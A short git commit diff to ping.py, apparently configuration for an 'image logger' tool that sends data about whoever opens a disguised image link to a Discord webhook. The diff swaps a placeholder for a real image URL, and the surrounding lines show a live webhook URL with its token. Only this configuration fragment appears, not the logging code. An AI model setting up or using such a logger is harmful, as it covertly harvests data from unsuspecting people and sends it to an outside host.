46043a087f1deebe20ddf1511ffc6712ae0d1fdb
ROBLOX10HIB <109238738+ROBLOX10HIB@users.noreply.github.com>
2025-11-30 00:28:24 +0300

    Update ping.py

--- ping.py
+++ ping.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1444439307556225250/8myJPjXyMduaU1XSZM6DtRGmmwsdzqmt6WI9q3_AnSfy60lpzljO17BqX3a_WXSWa1qM",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "image": "https://i.suar.me/vO7P6/l", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
